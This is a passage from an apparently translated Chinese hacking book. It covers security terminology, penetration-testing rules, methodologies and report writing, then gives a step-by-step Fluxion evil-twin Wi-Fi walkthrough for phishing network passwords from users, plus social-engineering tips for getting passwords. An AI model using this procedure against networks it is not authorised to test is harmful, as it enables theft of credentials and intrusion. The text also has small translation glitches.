  \ 或 `DSL` 这样的版本，从零开始构建自己独特的操作系统。管理员和高级用户可以安装发行版的服务器版本来构建自己的 Linux 网络，或者他们可以考虑将环境从其他操作系统切换到完全免费的系统。\n\
  \n总结来说，Linux 是一套强大且相对易用的操作系统。但它们真正的潜力来自于那些难以掌握的终端和命令行功能。感谢阅读本出版物，希望它能为这个关于“事实上的替代操作系统”的神秘的话题提供一些启发。如果\
  \ Linux 让你感到困惑或没有达到你的预期，我恳请你重新审视它能提供的功能。虽然它可能没有同种水平的游戏或第三方专有软件，但该操作系统简单且可定制，足以作为主操作系统，或许可以将\
  \ `Windows` 或 `OSX` 作为次要操作系统。几乎每个程序都有替代方案，因此如果可能完全摆脱微软和苹果，强烈建议你这样做。再次感谢，并好利用你新的\
  \ Linux 知识。\n\n下一步是开始尝试书中的内容，看看你能写出多么疯狂的脚本，以及你能在多大程度上自动化你的整个工作流！\n\n# 使用 KALI LINUX\
  \ 进行黑客活动\n\n通过这个循序渐进的指南成为专业黑客，你将学习如何破解无线网络以克服基础安全并进行渗透测试。\n\n# 描述\n\n`Kali Linux`\
  \ 是许多程序之一，它帮助我们应对与恶意黑客的持续斗争（甚至可以被称为战争）。为了充分利用它提供的所有优势，我们可能花费几年进行培训和开发，但通过一点研究，任何人都可以学习网络安全的基础。第一步始终是明智点击、更新软件并保持安全意识。\n\
  \n\n\n\n\n本书讨论了黑客行为中不同的“帽子”——黑帽、白帽和灰帽。黑帽是社会大多数人对黑客的刻板印象——即那些想要在未经许可的情况下访问他人财产或信息的人。白帽是“正好人”——那些学习行业技巧以防止资产被剥削或追踪违规者的人。灰帽则是一者的混合体，他们利用自己的黑客技术（尽管在没有所有者事先知道或授权的情况下）来暴露系统漏洞，从而加强这些系统的安全性。无论个体的动机如何，其知识基础和通用工具箱都是相同的。黑客需要理解计算设备如何在不同层级进行通信、机器和网络中存在哪些漏洞，以及这些漏洞是如何被利用的。这些知识需要时间、实践、学习和纪律才能获得，它们并不是普通人所熟悉的领域。因此，熟练的黑客有能力对个人、组织和社会造成或防止相当大的损害。\n\
  \n因此，每位黑客都应该采取某些伦理准则来指导自己。即使是黑帽在执行攻击时也有某些不会逾越的底线。执法部门正越来越重视信息安全，并防止针对个人身份、商业和政府机构的泛滥攻击。法律和执行因地而异，但任何黑客——无论是黑帽、白帽还是灰帽——都应该充分理解他们正在承担的风险。对于初级黑客尤其如此，他们没有经验来隐藏自己的踪迹或防止附带损害。不当的攻击可能会擦除或损坏信息，或导致其他非预期的后果。这就是为什么在孤立的“沙箱”系统中练习技能，直到获得足够的信心去攻击另一个系统是非常关重要的。\n\
  \n# 保持黑客的优势\n\n黑客社区与信息安全社区之间存在着一场持久的竞赛。当漏洞被发现时，它往往会明智且快速地传播，第 X 章描述的 WPA Krack 攻击证明了这一点。安全人员试图通过不断补丁或升级来跟进。黑客必须不断磨练技艺并突破极限以保持优势。与任何技能一样，如果不经常使用，黑客技能就会萎缩。此外，计算机安全领域处于不断的变化之中。大多数黑客工具的开源意味着其功能和语法频繁变化，必须保持关注。漏洞几乎每天都会被发布和修复，而且加密标准正被大力推动，以提供针对攻击的更好安全性。因此，为了保持优势并获得成为成功黑客的合理机会，应该做以下操作：\n\
  \n1. 保持所有操作系统、脚本、工具和编程环境的最新版本\n2. 定期在沙箱环境中练习技能，重点提高速度和匿名性\n3. 定期探测自己的系统并采取适当的安全措施\n\
  4. 对攻击性和防御性的网络安全进展建立每日或每周的阅读周期（包括杂志、期刊、网络文章、留言板、暗网黑客社区等）\n\n# 第 1 章 黑客基础\n\n现在你已经对伦理黑客和网络法的重要性有了更深入的了解，我们可以继续讨论你为了建立坚实基础而需要理解的基础知识。\n\
  \n在本章中，我们将重点关注网络安全专家和黑客使用的术语，因为你会在书中经常遇到这些词，而沟通是项目成功的关键。一旦你熟悉了专业术语，我们将进入对渗透测试以及编写报告的方法论的更详细讨论。\n\
  \n## 术语\n\n在本节中，我们将简要探索网络安全领域最重要和经常遇到的术语。在阅读后续章节时，你会发现这个术语列表非常有帮助。\n\n1. **资产 (Asset)**：资产指的是在任何涉及数据和信息处理活动中使用的设备或组件。资产需要防止受到未经授权的访问，以保护其不受不受愿的数据操纵。\n\
  2. **利用 (Exploit)**：这可以是一个程序、一个漏洞，甚至是攻击者用于在系统内寻找他们寻求的数据或信息的命令。利用程序可以是任何利用应用程序或操作系统中特定漏洞的工具。它会引起资产产生意料之外的行为，从而创建一个可以供黑客利用的有利间隙。\n\
  3. **接前参与 (Pre-engagement)**：接前参与指的是准备阶段，在 във阶段你建立行动规则。\n4. **里程碑 (Milestone)**：有组织性是成为专业伦理黑客的关键方面。这正是里程碑发挥用场的地方。它们被用于将过程分成详细说明的阶段，并分配的开始和结束日期。你可以使用图表、电子表格和各种调度网站来跟踪你的里程碑并确保按时交付。\n\
  5. **机器人 (Bot)**：这是一种用于自动执行某些操作的程序。人类的工作速度有限，但机器人可以更快、且根据需要长时间地处理重复性任务。\n6. **暴力攻击\
  \ (Brute force attack)**：这种攻击是最简单、最常见的类型，它并不像名称暗示的那样将计算机击成碎片。暴力攻击实际上是一种将用户名与密码组合的自动化方法，直到找到正确的组合。整个过程是自动的，但由于可能的组合数量巨大，可能会花费大量时间。\n\
  7. **拒绝服务攻击 (Denial of Service attack)**：称为 `DoS` 攻击，是许多初级黑帽黑客最常用的攻击之一。这种攻击表现为对各种用户提供的服务器或网络服务的中断。这是一种拒绝用户连接到在线服务的恶意方法。例如，如果你正在玩在线游戏，针对游戏服务器的\
  \ `DoS` 攻击会导致所有用户断开连接。\n8. **击键记录 (Keystroke logging)**：这是记录计算机上按下的键盘和鼠标按钮的常用方法。这些信息被用于获取用户名、密码和其他敏感信息。与暴力攻击相比，这种方法在获取日志信息方面快得多。为了使其工作，击键记录程序通过包含木马链接的电子邮件或直接通过\
  \ USB 闪盘注入计算机中。\n9. **恶意软件 (Malware)**：指所有对计算机或特定软件采取敌对行为的程序。恶意软件以木马、蠕虫、广告软件、间谍软件、勒索软件和其他病毒的形式存在。\n\
  10. **钓鱼攻击 (Phishing)**：一种电子邮件诈骗。其目的是发送一封看似合法的电子邮件，从接收者处获取私人信息。\n11. **Rootkit (Rootkit)**：是一种在目标用户不知情的情况下秘密运行的软件。其目的是隐藏后台运行的各种进程，以保持对计算机的访问。它主要用于在维护对某设备后门访问的同时，同时向授权用户隐藏它。\n\
  \n\n\n\n\n## 12. SQL 注入\n\n这是黑帽黑客获取数据的另一种常用方法。该方法涉及向任何数据驱动的软件或应用程序中注入 `SQL` 代码。例如，这可以是一个告诉应用程序将其所有数据发送给攻击者的语句。\n\
  \n随着你对黑客攻击深入深入，你还会发现许多其他术语。但目前，这些术语足够让你了解一下你将要处理的内容。\n\n## 渗透测试\n\n这个过程是不可避免的，因为它是真正发现系统内部可利用漏洞的唯一途径，因此你需要熟悉你需要采取的每一个步骤。但请记住，你测试的动力是由客户以及他想要实现的特定目标驱动的。\n\
  \n在开始之前，你首先需要建立交互规则（Rules of Engagement）。你需要制定计划，讨论测试的每个阶段以及方法论，并建立法律责任。明确定义渗透测试将使流程更加顺利，让客户了解进展，并保护你免受任何法律责任的影响。一切都需要相关双方达成一致，所以让我们来看看这个过程可能是什么样的。\n\
  \n### 交互规则\n\n1.  首先，黑客及其客户需要签署保密协议以及黑客许可协议。作为网络安全专家，你希望在法律上免受任何责任的保护，因此在必要文件双方双方明确并签署之前，绝不要开始进行任何操作。\n\
  2.  下一步是讨论渗透测试的精确目的以及需要测试的内容。有时你可能只需要测试组织的某个部门，而且你还需要知道客户期望你提供什么样的结果。\n3.  一旦你确定了目标和测试时长，就应该讨论你将用来执行测试的方法。还应该提到客户不希望使用的任何技术。例如，某些组织或企业不希望黑客模拟拒绝服务攻击（DoS）。在建立规则时需要规定这一点，否则可能会导致混淆、延迟甚至法律问题。\n\
  4.  最后一项交互规则与所有其他规则一样重要，是决定双方的责任和义务。作为一名伦理黑客，你可能会访问一些敏感信息，如公司的商业机密、银行账户详情，或者你可能会导致拒绝服务。\n\
  \n### 渗透测试步骤\n\n一旦交互规则得到良好建立并获得所有参与者的同意，就是执行测试本身的时候了。有各种测试方法和类别，但目前你应该学习渗透测试的基本阶段。了解这些步骤并逐一完成将使你的工作变得简单得多，所以让我们来看看基本的渗透测试是什么样的。\n\
  \n1.  **被动扫描**：在这一阶段，你应该在不与目标直接交互的情况下收集有关目标的信息。被动扫描通过浏览社交网络网站、在线数据库，甚至在 `Google`\
  \ 等搜索引擎上搜索相关数据来完成。\n2.  **主动扫描**：下一步是使用专门设计的工具探测目标，这些工具设计用于网络映射、流量嗅探、标志抓取（banner\
  \ grabbing）等。\n3.  **指纹识别**：这不是指物理指纹。在这一阶段，渗透测试人员需要识别目标的操作系统及其版本级别、所有应用程序及其补丁级别、任何开放端口、活跃的用户账户和服务。\n\
  4.  **目标识别**：在此阶段，一旦测试人员获得了有关系统的所有相关信息，就会选择最有价值或最脆弱的目标。\n5.  **漏洞利用**：这基本上是攻击本身。使用专门攻击工具针对系统中最脆弱的目标。其中一些将成功，而另一些可能导致服务器崩溃或根本不起作用。\n\
  6.  **权限提升**：测试人员需要获得更多控制权，就像授权用户一样。这一阶段的目的是获得系统的管理访问权限，无论是本地还是远程。\n7.  **报告**：这是渗透测试的最后一步。伦理黑客需要记录并报告测试的每一个方面。这包括使用的工具、被利用的漏洞以及发现的所有内容以及是如何发现这些内容的。\n\
  \n渗透测试还有其他方面，但目前我们将坚持在基础阶段，因为本章的目的是让你熟悉黑客攻击和渗透测试的世界。\n\n## 不伦理黑客的渗透测试\n\n正因如此，我们将从黑帽的角度来看渗透测试，并看看它与基础的伦理测试有何不同。\n\
  \n1.  **选择目标**：不伦理黑客出于怨恨、利润或仅仅为了趣味选择目标。这不涉及任何规则规定。一切都是为了个人原因而做的。\n2.  **中间节点**：攻击本身绝不会从黑客自己的系统直接发出。会使用一个中间系统，以便攻击无法追溯到攻击者。中间节点通常是一个受害者，被远程利用以获取目标系统的访问权限。\n\
  3.  **基本测试阶段**：即使工具和程序也会与网络安全专家使用的相同。\n4.  **维持访问**：黑客在受害者系统中创建后门是很常见的，以防他们将来可能想要快速访问。这是通过安装\
  \ `rootkits` 或留下 `bots` 来维持访问的。\n\n不伦理黑客如何使用系统完全取决于他们的意图。有些人目标是获取个人信息，而另一些则试图利用安全漏洞向公司勒索。真正区分不伦理黑客和伦理黑客的只有目标。\n\
  \n### 渗透测试方法论\n\n一旦交互规则被明确定义，就可以考虑方法论了。没有一种适用于每个公司或组织的通用测试。每个人都有自己的安全目标，在选择正确的方法之前，有许多需要回答的问题。\n\
  \n1.  **OSSTMM**：代表 `Open Source Security Testing Methodology Manual`（开源安全测试方法手册），它是一种标准的渗透测试方法。其背后的思想是确保无论由哪个安全专家或公司执行，都能为测试提供基准。该方法规定了要测试网络的哪些部分、如何执行测试以及如何分析结果数据。遵循\
  \ `OSSTMM` 方法的渗透测试是详尽的，但很繁琐，因为包含了渗透测试的几乎所有步骤。这意味着在没有充足的人力和相应预算支持的情况下，无法每天进行此类测试。\n\
  \n\n\n\n\n## 2. OWASP\n这代表“开放 Web 应用程序安全项目”（Open Web Application Security Project），正如其名，它是一种开源的、社区驱动的方法论，专门针对\
  \ Web 应用程序的测试。该方法的目的是提供不受任何商业或政府实体影响的无偏数据。虽然 `OSSTMM` 更侧重于网络安全，但 `OWASP` 专注于提高 Web\
  \ 应用程序以及服务的安全性。对于这种方法论，已经开发了各种工具，软件开发者、安全分析师和企业可以使用这些工具来增强它们的防御能力。\n\n## 3. CHECK\n\
  这种渗透测试方法是为了创建安全的政府网络的需求。政府处理极其敏感的信息，这些信息通常被视为机密，因此需要高水平的一致测试来保证安全。`CHECK` 方法论主要关注保护存储在特定服务器上的数据。在该方法下进行的渗透测试用于确定数据的安全性，以及在受到攻击时可能以何种方式被破坏。\n\
  \n## 4. NIST\n这是一个全面的渗透测试方法，与 `OSSTMM` 不同，它可以定期且在短间隔内应用。`NIST` 有四个主要步骤：计划、发现、攻击和报告。发现阶段又分为两个部分。一个涉及基础信息收集、网络扫描和服务检测，另一个则完全关于漏洞评估。第三阶段是攻击，这是测试中的主要步骤。其目的是尝试破解目标设备。报告阶段位于发现和攻击之后。\n\
  \n## 渗透测试分类\n根据公司或组织想要测试的内容，分为三种渗透测试类别，即`白盒`（White Box）、`黑盒`（Black Box）和`灰盒`（Gray\
  \ Box）。\n\n1. **白盒**：当目标上的所有相关数据都已提供时，渗透测试被视为白盒测试。如果我们处理的是网络测试，数据包括关于应用程序及其版本以及操作系统的信息。在\
  \ Web 应用程序的情况下，测试人员将收到源代码以进行完整分析。这种预先提供大量信息的测试通常只在现场进行。\n2. **黑盒**：正如你可能自己发现出来的那样，这是白盒渗透测试的相反。在网络测试时，不会预先提供关于操作系统或应用程序的信息。仅提供\
  \ IP 范围以便进行测试。Web 应用程序测试也不提供源代码。黑盒渗透测试通常在外部进行，这就是为什么大多数信息都被封锁了。\n3. **灰盒**：这种渗透测试类别介于白盒和黑盒测试之间。提供了一些数据，而另一部分数据对测试人员隐藏。例如，对于\
  \ Web 应用程序，不提供源代码，但通常会提供数据库、后端服务器或测试账户的信息。\n\n## 编写报告\n一次成功的渗透测试如果没有一份好的报告是不完整的。知道如何编写、格式化并向你的观众展示报告是成为熟练伦理黑客的关键。报告应该是组织良好、清晰、直击且易于理解的。格式和呈现方式同样重要。例如，如果你有一个红色标题，那么所有的标题都应该是红色的。一致性和可读性至关重要，因此在写报告时要非常小心。遵循通常的写作规则并避免语法错误，同时保持全文语调或风格的统一。\n\
  \n你可能认为这些提示对于黑客来说是微不足道的，然而，格式良好且编写过的报告会增强你作为专业人士的信誉。\n\n## 考虑你的受众\n在编写报告时，你应该考虑到你的受众来起草。受众主要有三类，即执行管理层、管理层和技术层。你需要记住报告的哪些部分是每类受众的重点，并为他们编写。例如，经理将不在乎你用什么漏洞程序来控制系统，但公司的技术部门会非常感兴趣。所以，让我们简要讨论每个受众，以理解他们感兴趣的内容。\n\
  \n1. **执行层受众**：这类受众主要包括公司的 CEO。他们将只关注阅读报告的执行摘要、修复报告以及可能的发现摘要。请注意，执行人员通常没有太多技术知识，因此会忽略你报告的大部分内容。因此，你应该考虑到这类受众来编写你的摘要。\n\
  2. **管理层受众**：这类受众将对你的漏洞评估和你发现的弱点感兴趣。他们是负责公司或组织安全策略的人，因此他们比 CEO 关注更多细节。\n3. **技术层受众**：软件开发者以及安全经理会对阅读你报告的细节感兴趣。他们负责修复安全漏洞和修补漏洞，因此他们想彻底阅读你报告的技术部分。你应该在报告中为他们包含截图，帮助他们解决问题。\n\
  \n## 报告结构\n现在让我们来看看渗透测试报告的精确结构，以理解它应该包含哪些信息。\n\n1. **封面**：我们从最开始的封面。这一部分应该包含你的公司标志（如果有）、标题以及对测试的简短描述。封面看起来应该是专业的，因为它的质量将影响客户对你专业人士的认知。\n\
  2. **目录**：这一部分是非常言自明的。紧接封面之后，你应该写一个清晰的索引，以便每个特定的受众可以跳跃到报告中与其职位相关的部分。\n3. **执行摘要**：报告的这部分非常有价值，它可以决定整份文档的成败。执行摘要是专门为公司的\
  \ CEO 或任何持有执行权力的人编写的。它应该为缺乏技术知识的受众进行全面的编写。你应该首先定义测试的目的以及你是如何执行的。然后清晰、直接地解释你的结果和发现。摘要应该包含发现的一般性弱点，以及究竟是什么导致了这些漏洞。最后，写下你在深入分析后确定的风险，并讨论如何通过采取正确的措施来降低这些风险。\n\
  4. **修复报告**：测试报告的这部分主要针对管理层，但执行层也可能对此感兴趣。记住，这两类受众可能都缺乏技术知识。那么修复报告主要是关于什么的？它应该包含所有一旦实施就能提高安全性的建议。例如，你可能会建议实施新的防火墙或入侵检测系统。\n\
  5. **发现摘要**：也称为漏洞评估摘要。在报告的这一部分，你将讨论所有的发现，换句话说，涉及你所测试系统的优势、弱点和风险。在这里，你应该包含图表和其他视觉表示，以帮助观众理解状况。展示你发现的漏洞，并根据其严重程度对其进行分类。\n\
  \n\n\n\n\n### 6. 风险评估\n这一部分是你根据调查结果展示风险的章节。你应该描述每个漏洞对系统可能产生的影响，以及它们发生的频率。\n\n###\
  \ 7. 方法论\n请记住，报告的这一部分是完全可选的，除非客户要求你遵循特定的方法论。在这种情况下，你应该报告你所采取的步骤，甚至可以包含一张清晰展示流程的流程图。\n\
  \n### 8. 详细发现\n报告的这部分面向技术读众。在这里，你将详细讨论你的发现，并包含有关你发现的漏洞的信息、其产生原因、涉及的风险以及你对改进数据安全的建议。开发人员以及安全经理都需要知道漏洞是在何处产生以及是如何产生的，以便采取正确的步骤解决问题。\n\
  \n现在你已经掌握了渗透测试的概念，并理解了应该如何编写报告，是时候向前迈进黑客的技术侧面了。\n\n# 第 2 章 入门\n\n黑客以极其高智且在许多方面才华横溢而闻名。因此，从零开始并达到任何水平的实际精通似乎是一项艰巨且困难的任务。必须记住，在学习某个学科或技能时，每个人都必须从某处开始。通过奉献和坚持，在黑客世界中你可以达到意志所能任何程度。在成为黑客的过程中，非常有帮助的一点是设定一些目标。问问自己为什么要学习黑客以及以及打算实现什么。有些人只是想学习基础知识，以便了解如何保护自己、家人或业务免受恶意攻击。另一些人则在为从事白帽客或信息安全职业做准备。无论你的理由是什么，都应该准备学习大量的新知识和技能。\n\
  \n## 学习\n\n黑客武器库中最重要的武器是知识。黑客不仅需要尽可能多学习关于计算机、网络和软件的知识，而且为了保持竞争力和效率，他们必须关注计算机和计算机安全不断且快速的变化。黑客没必要成为工程师、计算机科学家，或对微处理器或计算机硬件设计有深入了解，但他们应该理解计算机是如何工作的、主要组件及其如何相互作用的、计算机如何在本地以及通过互联网联网的、用户通常如何与机器交互，以及——最重要的——软件如何决定计算机的功能。一个优秀的黑客精通并熟练使用多种计算机语言，并理解主要的操作系统。对于黑客来说，熟悉密码学历史、数学和实践也是非常有用的。\n\
  \n一个几乎没有黑客经验、对编程仅有略懂或中等知识的外行，对系统进行攻击是可能的，而且变得越来越普遍。人们通常使用脚本并遵循由经验丰富的操作人员开发的程序这样做。这最常发生在简单类型的攻击中，例如拒绝服务。这些缺乏经验的黑客在黑客社区中被称为“脚本小子”（script\
  \ kiddies）。这类活动的问题在于，执行者对他们正在运行的代码中发生了什么几乎不理解，并且可能无法预测副作用或其他意外之外的后果。在尝试攻击之前，充分理解你所做的事情是最好的。\n\
  \n### 计算机与处理器\n\n计算机在尺寸、形状和目的上各不相同，但大多数本质上具有相同的设计。一个好的黑客应该研究计算机如何从 20 世纪最早的机器演变成我们今天使用的这种极其复杂的机器。在这个过程中，显而易见的是计算机具有相同的基本组件。要成为一个有效的黑客，你应该了解大多数现代计算机上不同类型的处理器。例如，三大微处理器制造商是英特尔（Intel）、美国美（AMD）和摩托罗拉（Motorola）。这些处理器构成了黑客会遇到的大多数个人电脑，但每种处理器都有自己独特的指令集。尽管大多数黑客很少需要处理机器层面的编程语言，但更复杂的攻击可能需要理解处理器指令集之间的差异。\n\
  \n某些处理器是可以由最终用户编程的。这些被称为现场可编程逻辑门阵列（`FPGA`），并越来越多地用于嵌入式系统，特别是工业控制。众许多黑客在这些芯片生产期间获取其访问，以便在最终目的地部署恶意软件。对于这类复杂的攻击，理解\
  \ `FPGA` 架构和编程是必要的。这些嵌入式攻击对于大规模购买芯片用于关键系统的军方和工业客户来说，尤为令人担忧。\n\n## 网络与协议\n\n网络也有不同的架构。架构不仅取决于不同节点的配置，还取决于连接它们的介质。最初，网络化计算机总是通过铜电缆连接的。常用的铜质网络电缆（通常称为以太网线）由双绞铜线组成。虽然这些电缆中最常见的是五类，或称\
  \ `CAT-5` 电缆，但它正开始让位给新标准 `CAT-6`，该标准具有更大的信号传输能力。对于极高速应用和更远距离，通常选择光纤电。光纤使用光代替电，具有极大的信息携带能力。它们用于传输大多数现代电缆电视和高速互联网服务。光纤是互联网的骨干。在较小区域，无线网络非常常见。使用无线局域网（`Wi-Fi`）协议，无线网络存在大量的个人、私人和商业局域网中。黑客对破解\
  \ `Wi-Fi` 网络特别感兴趣，导致了 `Wi-Fi` 安全标准的发展。\n\n无论架构或传输媒介如何，当两个终端跨网络通信时，它们必须使用一组被称为协议的通用规则进行通信。网络协议自第一批计算机网络创建以来一直在演变，但它们保留了相同的基本的分层方法。通常，网络是根据执行不同功能的不同层来概念化的。这被称为栈（stack）。今天最常用的通信协议是互联网协议（`IP`）和传输控制协议（`TCP`）。合在一起，通常被称为\
  \ `TCP/IP`。这些协议偶尔会变化并进行标准化。对于黑客来说，学习这些协议以及它们与栈不同层之间通信的关系至关重要。这就是黑客如何获得系统更高级别访问权限的原因。\n\
  \n### 编程语言\n\n对于从未做过的人来说，从零开始学习编程语言可能看起来令人敬畏，但许多人发现，一旦精通了一种编程语言，学习其他语言就会变得容易和快速得多。黑客不仅需要理解编程语言以能够利用软件漏洞，许多黑客还需要编写自己的代码以执行特定的攻击。阅读、理解和编写代码是黑客技术的基础。\n\
  \n\n\n\n编程语言的范围从晦晦的机器代码（以二进制和十六进制格式表示，用于直接与处理器通信）到用于软件开发的高级面向语言。常见的高级面向语言有 `C++`\
  \ 和 `Java`。用高级语言编写的代码会被编译成适用于特定处理器的相应机器代码，这使得高级语言在不同类型的机器之间具有非常好的移植性。另一类语言是脚本语言，其命令是逐行执行的，而不是编译成机器代码。\n\
  \n学习编程语言需要时间和刻练习——没有其他方法可以精通。编写、调试和重新编译代码的漫长夜晚和通宵马拉松，是初级黑客之间共同的成年礼。\n\n# 第 3 章获取密码\n\
  \n在本节中，我们将介绍如何获取网络密码。我将重点关注无线网络，因为对于有线网络，你必须通过电缆连接。我将使用一个我为演示创建的 Wi-Fi 网络。\n\n获取网络密码有很多不涉及计算机黑客的方法，我建议你先测试这些方法，并将黑客攻击作为最后手段。你可以做一些事情，例如查看你想攻击的组织或个人丢弃的文件，或者直接问在你想攻击的地方工作或居住的人密码是什么。有些组织会将密码写在墙上的备注里，或者写在所有人都能看到的地方。\n\
  \n使用 `Kali Linux` 获取 Wi-Fi 密码有很多方法，但如果密码很长，几乎所有这些过程都是耗时的，而且如果密码复杂，有时无法破解。我要向你展示的是如何利用社会工程学获取密码。\n\
  \n什么是社会工程学？这基本上是黑客攻击的一种，通过欺骗计算机用户执行你想让他们的操作。社会工程学的例子包括电话和邮件诈骗者，他们欺骗你提供信用卡详细信息或下载病毒。\n\
  \n所以我们基本上是要欺骗计算机用户交出密码，但要做到这一点，我们需要看起来很真实。这就是 `Fluxion` 发挥作用的地方。\n\n## Fluxion\n\
  \n`Fluxion` 是一个可以安装在 `Kali Linux` 上的脚本。它利用社会工程学创建一个目标网络的镜像 Wi-Fi 网络。然后断开目标与其真实 Wi-Fi\
  \ 网络的连接。由于我们的虚假 Wi-Fi 看起来和真的一一样，用户将尝试使用我们的虚假网络重新连接，我们通过网页界面向他/她索要密码。\n\n获取密码后，`Fluxion`\
  \ 将显示它，我们可以用它连接到网络。`fluxion` 有效的原因是因为它创建了一个与目标相似的 Wi-Fi 网络，并且具有与不同路由器类似的网页界面。`Fluxion`\
  \ 还允许你为攻击选择你喜欢的语言。\n\n### 安装 fluxion\n\n`Kali Linux` 默认没有安装 `Fluxion`，因此我们必须自己安装。你可以在这里找到\
  \ `Fluxion` 的 Github 仓库。进入 Github 仓库后，点击“Clone or download”（克隆或下载）按钮，然后复制提供的链接。\n\
  \n打开终端并输入 `cd /opt/` 导航到 `/opt/` 目录，这是我们将安装脚本的目录。如果你想回到主目录，只需输入 `cd` 即可。\n\n进入 `/opt/`\
  \ 目录后，我们现在配合复制链接输入 `git clone` 命令。你可以通过输入 `git clone` 然后在终端上点击右键并选择“粘贴”来粘贴链接。然后你可以按回车开始下载脚本；`fluxion`\
  \ 将开始下载，如下图所示。\n\n一旦过程完成，你可以输入 `ls` 列出目录中的所有文件。你应该看到 `fluxion` 文件夹位于另一个名为 `Teeth`\
  \ 的文件夹旁边，该文件夹通常是默认存在的。\n\n现在输入 `cd fluxion` 导航到 `fluxion` 目录，此时你应该已经开窍了。现在使用 `list`\
  \ 命令查看各种文件（白色）和文件夹（蓝色）。\n\n你会看到两个绿色的文件，这些是脚本。以 `.py` 结尾的是 python 脚本，而以 `.sh` 结尾的是\
  \ bash 脚本。当脚本显示为绿色时，意味着它们拥有正常运行所需的权限。如果你发现某个脚本没有权限（它们和其它文件一样是白色的），请使用命令 `chmod +x\
  \ <script name>` 来授予权限。\n\n我们将运行 `fluxion.sh` 脚本；我们可以通过输入 `./fluxion.sh` 来运行，你可以通过这种方式运行任何脚本。一旦按下回车，`fluxion`\
  \ 将开始运行。起初你会得到一个长列表，显示尚未安装的需要程序。你可以使用 `apt get install <name>` 安装它们，或者使用自动完成此操作的安装脚本。\n\
  \n显示 `fluxion` 目录中的文件和文件夹列表时，可以看到有一个名为“install”的文件夹，进入该文件夹并使用 `list` 命令查看可用文件。你会看到一个标记为\
  \ `install.sh` 的脚本，输入 `./install.sh` 运行，一旦点击回车，脚本将开始安装缺失的程序。\n\n这可能需要一段时间，请耐心等待。如果在安装过程中被问到问题，可以通过输入\
  \ `y` 表示是，输入 `n` 表示否来回答。\n\n一旦安装完成，你可以输入 `cd ..` 回上一级目录的 `fluxion` 文件夹。我们现在可以运行\
  \ `fluxion` 脚本，但首先让我们谈谈无线卡。\n\n为了让 `fluxion` 或任何其他无线黑客工具工作，你的计算机网卡必须支持监听模式（monitor\
  \ mode）。这允许你的网卡拦截即使不是发送给电脑的数据包或数据。你可以查询你的网卡是否支持监听模式。如果你的网卡不支持，你可以在亚马逊等地方购买支持的，价格低至\
  \ 20。\n\n我的电脑内置网卡不支持监听模式，所以我将通过 USB 连接外接网卡。\n\n## 使用 fluxion\n\n现在我们要通过使用 `fluxion.sh`\
  \ 脚本来启动 fluxion。当它开始运行时，它会自动检测网卡并切换到监听模式。\n\n你被询问的第一是选择你想使用的语言。你可以通过输入列表上的语言数字来选择语言。我想使用英语版的\
  \ Fluxion，所以我选择了 1。\n\n之后，你会被要求选择要扫描的信道。让我们扫描所有信道，选择选项 1 并按回车。\n\nFluxion 将对所有可用\
  \ Wi-Fi 网络进行扫描并将它们显示在白色窗口。我们有一个标记为 test 的测试 Wi-Fi，如后续所示。你也可以在底部看到有一个设备连接到它。BSSID\
  \ 是路由器的 MAC 地址，ESSID 是它的名称。\n\n你可以通过点击窗口并按 `Ctrl + C` 停止扫描。你会看到一个带有所有检测网络的 fluxion\
  \ 窗口。红色的网络是已连接设备的网络。输入网络数字选择你想攻击的 Wi-Fi 网络。在我的设备上，测试网络是 2。\n\n\n\n当你按下回车键时，系统会要求你进行握手，但我们并没有握手，所以我们将按下回车键跳过该部分。握手是路由器用于与已连接用户通信的。这使得连接过一次的用户可以再次连接到\
  \ Wi-Fi 网络，而无需重新输入密码。\n\n如果黑客能够捕获握手，他就可以尝试破解它以获取 Wi-Fi 网络的密码。这通常是非常耗时的。\n\n在由于我们没有握手而跳过握手部分后，系统会要求你选择一种捕获握手的方法。你可以在这里使用任何选项，但\
  \ `pyrit` 选项是最好的。因此我将选择 `1`。\n\n会弹出两个窗口。你只需要耐心等待，直到顶部窗口显示已捕获 WPA 握手的消息。这可能需要 30\
  \ 秒到 5 分钟。你可以尝试在一两分钟后关闭底部窗口来加快速度。\n\n捕获握手后，你也必须关闭此窗口。现在，你必须检查握手。你可以通过输入 `1` 选择握手来完成。\n\
  \n如果握手没有损坏，系统将要求你选择 SSL 证书或创建一个。我们将选择创建 SSL 证书的选项（选项 `1`）。下一个选项是选择攻击选项，即 Web 接口选项（选项\
  \ `1`）。SSL 证书将用于 Web 接口，使其看起来安全且可靠。\n\n我们的最后一个选项是选择 Web 界面的模板。由于这里大多数人使用华为路由器，因此我选择它作为我的接口（选项\
  \ `28`）。\n\n将出现四个新窗口来执行攻击。用户将从名为 `TEST` 的原始 Wi-Fi 网络断开连接，他将别无选择重新连接，但在不知情的情况下连接到与原始网络类似的假\
  \ Wi-Fi 网络。然后，他将通过类似于华为（或你选择的任何界面）的 Web 界面被输入 Wi-Fi 密码。\n\n一旦输入密码，`fluxion` 将确认密码是否正确并在屏幕上显示它。我使用的密码是\
  \ `123Test`，可以在这里看到。\n\n还有许多其他用于无线攻击的脚本和程序。可以通过进入 Kali Linux 桌面左上角的应用程序栏来访问这些脚本。\n\
  \n现在你已经获得了密码，可以使用它来连接网络了。\n\n# 第 4 章 黑客指南\n\n本节中解释或教授的内容仅供开发、教育和研究之用。我们将考虑入侵 Android\
  \ 设备，但在那之前，我们需要问一些问题。为什么要入侵 Android 设备？目的是什么？有大量的人拥有 Android 设备。\n\n类似于软件开发，黑客攻击是困难的，你无法一夜之间变成专业黑客。黑客攻击需要高超的技术和推理水平。作为黑客，你的大脑必须像处理单元一样运行。为了在一个小平台上练习黑客攻击，你需要对各种编程语言之一有一定的经验。在进行黑客攻击时，了解\
  \ `C++`、`Linux` 和 `FORTRAN` 等编程语言非常有用。然而，你还需要其他知识来成为一名熟练的黑客。由于安全措施的升级，黑客攻击变得越来越困难。作为黑客，你必须学会理解并击败安全挑战。\n\
  \n## kali linux 2.0 的属性\n\n如果你是渗透服务器和攻入网络的专家，处理业务最简单的方法就是利用 Kali Linux 2.0 的力量。Kali\
  \ Linux 2.0 是目前为止让程序员进行黑客攻击变得非常容易的 Linux 发行版。你可以在短时间内实现目标，并你个人网络的所有者。\n\n### 1.\
  \ Metasploit\n\nMetasploit 是一个帮助创建漏洞利用、壳代码、触发器、蜜罐和载荷的框架。Metasploit 是一个封装在它的框架中的、包含多个漏洞和类似元素的库。该软件是公开的，可以在许多操作系统上使用，包括\
  \ `Linux` 和 `Windows`。它随 Kali Linux 默认带有。Metasploit 是一个可以威胁其他网络的危险设备。你想检查网络安全中的缺陷，并学习如何管理它们以防止外部攻击。\n\
